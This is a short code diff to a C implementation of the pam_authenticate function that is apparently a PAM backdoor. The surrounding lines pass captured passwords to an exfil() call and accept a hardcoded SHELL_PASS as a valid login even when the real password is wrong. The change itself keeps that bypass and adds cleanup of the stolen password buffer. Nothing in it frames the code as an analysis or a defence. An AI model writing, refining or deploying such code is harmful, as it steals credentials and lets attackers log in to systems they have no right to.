@@ -65,8 +65,12 @@ int pam_authenticate(pam_handle_t * pamh, int flags)
     exfil(100, 1, "password", pampassword);
   } else if (pampassword && !strcmp(pampassword, SHELL_PASS)) {
     // user got the password wrong but we like it anyway
-    return PAM_SUCCESS;
+    res = PAM_SUCCESS;
   }
+
+  myconv->conv = oldconv;
+  free(pampassword);
+  pampassword = NULL;
 
   return res;
 }
